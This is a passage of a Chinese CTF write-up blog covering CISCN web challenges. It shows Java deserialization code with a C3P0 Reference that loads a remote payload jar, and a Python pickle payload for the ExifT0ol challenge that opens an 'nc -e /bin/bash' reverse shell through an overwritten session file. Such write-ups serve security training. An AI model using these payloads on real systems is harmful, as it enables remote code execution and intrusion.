    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object object)</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();
        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);
        objectOutputStream.writeObject(object);
        <span class="hljs-comment">//string = Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span>
        data = byteArrayOutputStream.toByteArray();
    }
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception {
        <span class="hljs-comment">//ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(Base64.getDecoder().decode(string));</span>
        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(data);
        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(byteArrayInputStream);
        objectInputStream.readObject();
    }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">C3P0DataSource</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable {

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException {
        <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">"Payload8"</span>,<span class="hljs-string">"Payload8"</span>,<span class="hljs-string">"http://127.0.0.1:5555/payload8.jar"</span>);
        <span class="hljs-comment">//Reference reference = new Reference("Payloadxx","Payloadxx","");</span>
        <span class="hljs-keyword">return</span> reference;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException {

    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException {

    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException {
        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException {
        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
    }
}</code></pre>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/BUTLER/p/17473487.html">2023 华北分区赛 normal_snake</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13279?time__1311=mqmxnDBD9DyDc0iD%2FD0Yx20AqwhOADIOGgbD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-8">记几道CTF-Java反序列化题目</a></p>
<h1 id="ciscn-2023-华北exift0ol">[CISCN 2023 华北]ExifT0ol</h1>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> web
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> exifread

web.config.debug = <span class="hljs-literal">False</span><span class="hljs-comment">#关闭调式模式</span>

<span class="hljs-comment">#定义url路由</span>
urls = (
    <span class="hljs-string">'/'</span>, <span class="hljs-string">'Index'</span>,
    <span class="hljs-string">'/upload'</span>, <span class="hljs-string">'Upload'</span>,
    <span class="hljs-string">'/exifhandler'</span>, <span class="hljs-string">'ExifHandler'</span>
)

app = web.application(urls, <span class="hljs-built_in">locals</span>())  <span class="hljs-comment">#传入了路由映射和locals()作为参数。</span>
render = web.template.render(<span class="hljs-string">'templates/'</span>)<span class="hljs-comment">#用于渲染模板文件</span>
session = web.session.Session(app, web.session.DiskStore(<span class="hljs-string">"sessions"</span>), initializer={<span class="hljs-string">'filename'</span>: <span class="hljs-string">''</span>, <span class="hljs-string">'filedir'</span>: <span class="hljs-string">''</span>, <span class="hljs-string">'exif'</span>: {}})<span class="hljs-comment">#用于存储会话信息，并初始化了filename、filedir和exif三个属性。</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Index</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GET</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> render.upload()<span class="hljs-comment">#显示上传文件的页面</span>


<span class="hljs-keyword">class</span> <span class="hljs-title class_">Upload</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GET</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> render.upload()   <span class="hljs-comment">#显示上传文件的表单</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">POST</span>(<span class="hljs-params">self</span>):
        params = web.<span class="hljs-built_in">input</span>(file={})<span class="hljs-comment">#获取上传文件对象</span>
        filedir = <span class="hljs-string">'uploads/'</span><span class="hljs-comment">#设置问文件上传所保存的目录</span>

        <span class="hljs-keyword">if</span> <span class="hljs-string">'file'</span> <span class="hljs-keyword">in</span> params:
            <span class="hljs-comment">#如果请求中包含文件对象'file'，则获取文件名并提取文件后缀</span>
            filename = params[<span class="hljs-string">'file'</span>].filename
            fileext = filename.split(<span class="hljs-string">'.'</span>)[-<span class="hljs-number">1</span>]
            <span class="hljs-comment">#如果不是指定的后缀，则给出警告，但并不会直接return（也就是没影响）</span>
            <span class="hljs-keyword">if</span> fileext.lower() <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">'jpg'</span>, <span class="hljs-string">'jpeg'</span>, <span class="hljs-string">'png'</span>, <span class="hljs-string">'gif'</span>]:
                <span class="hljs-built_in">print</span>(<span class="hljs-string">'Warning: only allow jpg, jpeg, png, gif!'</span>)

            <span class="hljs-comment">#将文件名和文件目录保存到会话的filename和filedir属性中。</span>
            session.filename = filename
            session.filedir = filedir
	
    		<span class="hljs-comment">#打开文件并将文件内容写入到文件中，关闭文件。</span>
            fout = <span class="hljs-built_in">open</span>(filedir + filename, <span class="hljs-string">'wb'</span>)
            fout.write(params[<span class="hljs-string">'file'</span>].value)
            fout.close()
            
            <span class="hljs-keyword">return</span> <span class="hljs-string">"&lt;script&gt;alert('successfully uploaded');window.location.href='/exifhandler'&lt;/script&gt;"</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'no file'</span>


<span class="hljs-keyword">class</span> <span class="hljs-title class_">ExifHandler</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">GET</span>(<span class="hljs-params">self</span>):
        <span class="hljs-comment">#检查会话中的filename和exif属性是否为空，以确定是否有文件上传和是否已经获取过EXIF信息。</span>
        <span class="hljs-keyword">if</span> session.filename != <span class="hljs-string">''</span> <span class="hljs-keyword">and</span> session.exif == {}:
            <span class="hljs-comment">#打开上传的文件并使用exifread.process_file(f)方法处理文件，将结果保存到tags变量中。</span>
            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(session.filedir + session.filename, <span class="hljs-string">'rb'</span>) <span class="hljs-keyword">as</span> f:
                    tags = exifread.process_file(f)

            exif_info = {}
            <span class="hljs-comment">#遍历tags字典，将以'EXIF'开头的标签和对应的值保存到exif_info字典中。</span>
            <span class="hljs-keyword">for</span> tag, value <span class="hljs-keyword">in</span> tags.items():
                <span class="hljs-keyword">if</span> tag.startswith(<span class="hljs-string">'EXIF'</span>):
                    exif_info[tag] = <span class="hljs-built_in">str</span>(value)

            session.exif = exif_info
<span class="hljs-comment">#将exif_info保存到会话的exif属性中，然后使用render.result方法渲染结果页面，并将filename和exif_info传递给模板进行显示。</span>
            <span class="hljs-keyword">return</span> render.result(filename=session.filename, exif_info=exif_info)
        <span class="hljs-keyword">elif</span> session.filename == <span class="hljs-string">''</span> <span class="hljs-keyword">and</span> session.exif == {}:
            <span class="hljs-keyword">return</span> <span class="hljs-string">"&lt;script&gt;alert('no file uploaded');window.location.href='/'&lt;/script&gt;"</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> render.result(filename=session.filename, exif_info=session.exif)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    app.run()</code></pre>
<p>分了上述代码在结合wp，这道题就是通过上传文件来覆盖session文件，覆盖之后，会自动经过ExifHandler路由进行处理，最终会通过模板渲染回显到页面（应该就是这里会造成漏洞）</p>
<p>既然是session文件，那就得利用反序列化，以序列化数据存入，最终渲染的时候反序列化，执行我们的恶意文件</p>
<p>虽然上述有白名单的检查，但是没有return之类的，只是单纯的警告，因此无用。</p>
<p>由于<code>filename</code>是可控的,而且也没有对其做任何过滤，此处就会有一个任意文件上传漏洞。</p>
<p>先构造payload</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> itsdangerous
<span class="hljs-keyword">import</span> pickle, pickletools
<span class="hljs-keyword">import</span> os
<span class="hljs-keyword">class</span> <span class="hljs-title class_">test</span>():

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.name = <span class="hljs-string">"test"</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-keyword">return</span> (os.system, (<span class="hljs-string">"nc ip port -e /bin/bash"</span>, ))
a = pickletools.optimize((pickle.dumps(test(), <span class="hljs-number">4</span>)))
<span class="hljs-built_in">print</span>(itsdangerous.base64_encode(a))</code></pre>
<p>这里不清楚的点就是为何在构造payload做了那些优化，最后还是编码了一下</p>
<p>将脚本输出内容上传到 <code>sessions</code>目录下的<code>888</code> 的文件中</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="C:/Users/%E4%BB%98%E6%80%9D%E9%92%A7/AppData/Roaming/Typora/typora-user-images/image-20240303145950542.png" alt="image-20240303145950542"></p>
<p>这里最后没有复现成功。。。真的难受</p>
<h2 id="参考文章">参考文章</h2>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/cyyyyi/p/17500269.html">春秋杯春季联赛&amp;&amp;ciscn2023华北赛区部分题解</a></p>
<h1 id="参考文章">参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/bmjoker/p/13508538.html">SSTI（模板注入）漏洞（入门篇）</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_64222098/article/details/130174324">[CISCN 2019华东南]Web11 题解</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11435298.html">刷题记录：[CISCN2019 华北赛区 Day2 Web1]Hack World</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/l2872253606/article/details/125244044">[CISCN2019 华北赛区 Day2 Web1]Hack World --BUUCTF</a></p>
<p><a target="_blank" rel="noopener" href="https://mayi077.gitee.io/2020/02/03/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web1-Dropbox/">[CISCN2019 华北赛区 Day1 Web1]Dropbox</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/shinygod/article/details/124759022">[CISCN2019 华北赛区 Day1 Web1]Dropbox</a></p>
<p><a target="_blank" rel="noopener" href="https://fushuling.com/index.php/2022/03/18/187/">CISCN 2019 初赛 Love Math</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11588219.html">刷题记录：[CISCN 2019 初赛]Love Math</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/magic123/articles/17525734.html">[CISCN 2019华东南]Web4</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/mochu7777777/article/details/107656285">BUUCTF：[CISCN2019 华东南赛区]Web4</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/h3zh1/p/12653579.html">[CISCN2019 华东南赛区]Double Secret</a></p>

<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/02/02/chang-gui-lou-dong-xue-xi-zong-jie/">常规漏洞学习总结</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/01/10/shen-ru-dvwa/">重温DVWA</a></div></section></div>




  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>感谢大佬们的不吝赐教！</p>

    </section>
    <section class='body cmt-body twikoo'>
      

<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2019%E5%8D%8E%E4%B8%9C%E5%8D%97web11"><span class="toc-text">[CISCN 2019华东南]Web11</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95%E5%88%A9%E7%94%A8"><span class="toc-text">静态方法利用</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2019%E5%8D%8E%E5%8C%97day2web1"><span class="toc-text">[CISCN 2019华北Day2]Web1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2019%E5%8D%8E%E5%8C%97day1web1"><span class="toc-text">[CISCN 2019华北Day1]Web1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2019%E5%88%9D%E8%B5%9Blove-math"><span class="toc-text">[CISCN 2019初赛]Love Math</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-text">方法一：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-text">方法二：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%89"><span class="toc-text">方法三：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E5%9B%9B"><span class="toc-text">方法四：</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2019%E5%8D%8E%E5%8C%97day1web2"><span class="toc-text">[CISCN 2019华北Day1]Web2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2019%E5%8D%8E%E4%B8%9C%E5%8D%97web4"><span class="toc-text">[CISCN 2019华东南]Web4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2019%E5%8D%8E%E4%B8%9C%E5%8D%97double-secret"><span class="toc-text">[CISCN 2019华东南]Double Secret</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2022-%E5%88%9D%E8%B5%9Bezpop"><span class="toc-text">[CISCN 2022 初赛]ezpop</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2022-%E5%88%9D%E8%B5%9Bonline_crt"><span class="toc-text">[CISCN 2022 初赛]online_crt</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2023-%E5%8D%8E%E5%8C%97ez_date"><span class="toc-text">[CISCN 2023 华北]ez_date</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2023-%E8%A5%BF%E5%8D%97do_you_like_read"><span class="toc-text">[CISCN 2023 西南]do_you_like_read</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2023-%E5%88%9D%E8%B5%9Bgo_session"><span class="toc-text">[CISCN 2023 初赛]go_session</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E8%AF%B4%E6%98%8E"><span class="toc-text">前置说明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#session%E4%BC%AA%E9%80%A0"><span class="toc-text">session伪造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-text">构造payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2023-%E5%8D%8E%E5%8C%97pysym"><span class="toc-text">[CISCN 2023 华北]pysym</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2023-%E5%88%9D%E8%B5%9Bdeserbug"><span class="toc-text">[CISCN 2023 初赛]DeserBug</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2023-%E8%A5%BF%E5%8D%97dataapi"><span class="toc-text">[CISCN 2023 西南]dataapi</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2023-%E5%8D%8E%E5%8C%97normal_snake"><span class="toc-text">[CISCN 2023 华北]normal_snake</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ciscn-2023-%E5%8D%8E%E5%8C%97exift0ol"><span class="toc-text">[CISCN 2023 华北]ExifT0ol</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">参考文章</span></a></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

